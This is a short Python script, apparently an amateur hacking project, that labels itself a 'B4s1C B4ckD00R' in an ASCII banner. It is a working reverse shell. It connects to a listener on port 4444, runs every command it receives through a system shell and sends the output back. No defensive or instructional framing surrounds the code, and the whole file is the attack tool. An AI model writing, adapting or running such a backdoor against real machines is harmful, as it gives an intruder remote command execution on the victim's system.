import pyfiglet
import socket
import subprocess
import time

ascii_banner = pyfiglet.figlet_format("@LaZa  \n B4s1C B4ckD00R")
print(ascii_banner)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host = "127.0.0.1"
port = 4444

for i in range(20) :
    try:
        s.connect((host,port))
        connected = pyfiglet.figlet_format(" Connected ")
        print(connected)
    except:
        time.sleep(2)

while True :
    data=b''
    while True :
        part = s.recv(4096)
        data += part
        if len(data) < 4096 : 
            break
        if len(part) < 4096 :
            break

    
    data=data.decode("utf-8")
    if data == "exit\n" :
        close = pyfiglet.figlet_format(" Closed ")
        print(close)
        break
    else :
            proc = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output = proc.stdout.read()+ proc.stderr.read()
            s.send(output)
s.close()